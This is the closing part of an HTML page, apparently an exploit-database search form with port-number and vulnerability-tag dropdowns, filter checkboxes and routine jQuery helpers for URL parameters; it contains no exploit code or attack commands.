                                    </option>


                                
                                    <option value="18881" >
                                        18881
                                    </option>


                                
                                    <option value="19000" >
                                        19000
                                    </option>


                                
                                    <option value="19810" >
                                        19810
                                    </option>


                                
                                    <option value="19813" >
                                        19813
                                    </option>


                                
                                    <option value="20000" >
                                        20000
                                    </option>


                                
                                    <option value="20002" >
                                        20002
                                    </option>


                                
                                    <option value="20010" >
                                        20010
                                    </option>


                                
                                    <option value="20031" >
                                        20031
                                    </option>


                                
                                    <option value="20111" >
                                        20111
                                    </option>


                                
                                    <option value="20171" >
                                        20171
                                    </option>


                                
                                    <option value="22003" >
                                        22003
                                    </option>


                                
                                    <option value="23423" >
                                        23423
                                    </option>


                                
                                    <option value="25672" >
                                        25672
                                    </option>


                                
                                    <option value="26000" >
                                        26000
                                    </option>


                                
                                    <option value="27015" >
                                        27015
                                    </option>


                                
                                    <option value="27700" >
                                        27700
                                    </option>


                                
                                    <option value="28015" >
                                        28015
                                    </option>


                                
                                    <option value="30000" >
                                        30000
                                    </option>


                                
                                    <option value="30303" >
                                        30303
                                    </option>


                                
                                    <option value="31337" >
                                        31337
                                    </option>


                                
                                    <option value="32400" >
                                        32400
                                    </option>


                                
                                    <option value="32674" >
                                        32674
                                    </option>


                                
                                    <option value="32764" >
                                        32764
                                    </option>


                                
                                    <option value="34205" >
                                        34205
                                    </option>


                                
                                    <option value="37215" >
                                        37215
                                    </option>


                                
                                    <option value="37777" >
                                        37777
                                    </option>


                                
                                    <option value="37848" >
                                        37848
                                    </option>


                                
                                    <option value="38292" >
                                        38292
                                    </option>


                                
                                    <option value="40007" >
                                        40007
                                    </option>


                                
                                    <option value="41523" >
                                        41523
                                    </option>


                                
                                    <option value="44334" >
                                        44334
                                    </option>


                                
                                    <option value="46824" >
                                        46824
                                    </option>


                                
                                    <option value="48080" >
                                        48080
                                    </option>


                                
                                    <option value="49152" >
                                        49152
                                    </option>


                                
                                    <option value="50000" >
                                        50000
                                    </option>


                                
                                    <option value="50496" >
                                        50496
                                    </option>


                                
                                    <option value="52311" >
                                        52311
                                    </option>


                                
                                    <option value="52789" >
                                        52789
                                    </option>


                                
                                    <option value="52869" >
                                        52869
                                    </option>


                                
                                    <option value="52986" >
                                        52986
                                    </option>


                                
                                    <option value="53413" >
                                        53413
                                    </option>


                                
                                    <option value="54345" >
                                        54345
                                    </option>


                                
                                    <option value="54890" >
                                        54890
                                    </option>


                                
                                    <option value="55554" >
                                        55554
                                    </option>


                                
                                    <option value="55555" >
                                        55555
                                    </option>


                                
                                    <option value="56380" >
                                        56380
                                    </option>


                                
                                    <option value="57772" >
                                        57772
                                    </option>


                                
                                    <option value="58080" >
                                        58080
                                    </option>


                                
                                    <option value="62514" >
                                        62514
                                    </option>


                                
                            </select>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <label for="tagSearchSelect" class="text-primary">Tag</label>

                            <select id="tagSearchSelect" name="tag" class="form-control">

                                <option></option>
                                
                                    <option value="1" >
                                        WordPress Core
                                    </option>


                                
                                    <option value="3" >
                                        Metasploit Framework (MSF)
                                    </option>


                                
                                    <option value="4" >
                                        WordPress Plugin
                                    </option>


                                
                                    <option value="7" >
                                        SQL Injection (SQLi)
                                    </option>


                                
                                    <option value="8" >
                                        Cross-Site Scripting (XSS)
                                    </option>


                                
                                    <option value="9" >
                                        File Inclusion (LFI/RFI)
                                    </option>


                                
                                    <option value="12" >
                                        Cross-Site Request Forgery (CSRF)
                                    </option>


                                
                                    <option value="13" >
                                        Denial of Service (DoS)
                                    </option>


                                
                                    <option value="14" >
                                        Code Injection
                                    </option>


                                
                                    <option value="15" >
                                        Command Injection
                                    </option>


                                
                                    <option value="16" >
                                        Authentication Bypass / Credentials Bypass (AB/CB)
                                    </option>


                                
                                    <option value="18" >
                                        Client Side
                                    </option>


                                
                                    <option value="19" >
                                        Use After Free (UAF)
                                    </option>


                                
                                    <option value="20" >
                                        Out Of Bounds
                                    </option>


                                
                                    <option value="21" >
                                        Remote
                                    </option>


                                
                                    <option value="22" >
                                        Local
                                    </option>


                                
                                    <option value="23" >
                                        XML External Entity (XXE)
                                    </option>


                                
                                    <option value="24" >
                                        Integer Overflow
                                    </option>


                                
                                    <option value="25" >
                                        Server-Side Request Forgery (SSRF)
                                    </option>


                                
                                    <option value="26" >
                                        Race Condition
                                    </option>


                                
                                    <option value="27" >
                                        NULL Pointer Dereference
                                    </option>


                                
                                    <option value="28" >
                                        Malware
                                    </option>


                                
                                    <option value="31" >
                                        Buffer Overflow
                                    </option>


                                
                                    <option value="34" >
                                        Heap Overflow
                                    </option>


                                
                                    <option value="35" >
                                        Type Confusion
                                    </option>


                                
                                    <option value="36" >
                                        Object Injection
                                    </option>


                                
                                    <option value="37" >
                                        Bug Report
                                    </option>


                                
                                    <option value="38" >
                                        Console
                                    </option>


                                
                                    <option value="39" >
                                        Pwn2Own
                                    </option>


                                
                                    <option value="40" >
                                        Traversal
                                    </option>


                                
                                    <option value="41" >
                                        Deserialization
                                    </option>


                                
                            </select>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-12">

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">

                                    <input class="form-check-input" type="checkbox"
                                           name="verified" value="true"
                                           id="verifiedSearchCheck"   >
                                    Verified

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">
                                    <input class="form-check-input" type="checkbox"
                                           name="hasapp" value="true"
                                           id="hasappSearchCheck" >
                                    Has App

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">
                                    <input class="form-check-input" type="checkbox"
                                           name="nomsf" value="true"
                                           id="nomsfCheck" >
                                    No Metasploit

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-12">

                            <button type="submit" class="btn btn-primary float-right">Search</button>

                        </div>

                    </div>

                </form>


            </div>

        </div>

    </div>

</div>

</footer>

    </div>

</div>

</body>

<!--   Make the default DataTables search field larger   -->
<style type="text/css">
    .dataTables_filter input {
        font-size: 16px;
    }
</style>

<!--   Core JS Files   -->
<script src="/js/core/jquery.min.js"></script>
<script src="/js/core/popper.min.js"></script>
<script src="/js/core/bootstrap.min.js"></script>

<script src="/js/plugins/perfect-scrollbar.jquery.min.js"></script>
<script src="/js/plugins/moment.min.js"></script>

<!-- Forms Validations Plugin -->
<script src="/js/plugins/jquery.validate.min.js"></script>

<!--  DataTables.net Plugin, full documentation here:
https://datatables.net/    -->
<script src="/js/plugins/jquery.dataTables.min.js"></script>

<!--  Notifications Plugin    -->
<script src="/js/plugins/bootstrap-notify.js"></script>

<!-- Control Center for Now Ui Dashboard: parallax effects,
scripts for the example pages etc -->
<script src="/js/now-ui-dashboard.js"></script>

<script src="/js/selectize.min.js"></script>

<script src="/js/app.js"></script>
<script src="/js/appfunctions.js"></script>


<script>
    window.addEventListener('popstate', () => {
        location.reload();
    }, false);

    $(function () {
        $('[data-toggle="tooltip"]').tooltip()
    })

    function getParameterByName(name, url) {
        if (!url) url = window.location.href;
        name = name.replace(/[\[\]]/g, "\\$&");
        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
            results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, " "));
    }


    function removeURLParameter(url, parameter) {
        //prefer to use l.search if you have a location/link object
        var urlparts= url.split('?');
        if (urlparts.length>=2) {

            var prefix= encodeURIComponent(parameter)+'=';
            var pars= urlparts[1].split(/[&;]/g);

            //reverse iteration as may be destructive
            for (var i= pars.length; i-- > 0;) {
                //idiom for string.startsWith
                if (pars[i].lastIndexOf(prefix, 0) !== -1) {
                    pars.splice(i, 1);
                }
            }

            url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");
            window.history.pushState('', document.title, url);
            return url;
        } else {
            window.history.pushState('', document.title, url);
            return url;
        }
    }

    function showFilters() {
        var x = document.getElementById("exploitFiltersCard");
        if (x.style.display === "none") {
            x.style.display = "block";
        } else {
            x.style.display = "none";
        }
    }

    function updateQueryString(key, value, url) {
        if (!url) url = window.location.href;
        var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),
            hash;

        if (re.test(url)) {
            if (typeof value !== 'undefined' && value !== null)
                return url.replace(re, '$1' + key + "=" + value + '$2$3');
            else {
                hash = url.split('#');
                url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');
                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
                    url += '#' + hash[1];

                window.history.pushState('', document.title, url);
                return url;
            }
        }
        else {
            if (typeof value !== 'undefined' && value !== null) {
                var separator = url.indexOf('?') !== -1 ? '&' : '?';
                hash = url.split('#');
                url = hash[0] + separator + key + '=' + value;
                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
                    url += '#' + hash[1];

                window.history.pushState('', document.title, url);
                return url;
            }
            else
                window.history.pushState('', document.title, url);
                return url;
        }
    }

    $('#search').submit(function() {
        $(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");
        return true; // ensure form still submits
    });

    // Un-disable form fields when page loads, in case they click back after submission
    $('#search').find( ":input" ).prop( "disabled", false );

    // If the ajax call fails, throw the error to the console instead of
    // popping up an alert to the user
    $.fn.dataTable.ext.errMode = 'throw';

</script>

<!-- App scripts -->



</html>
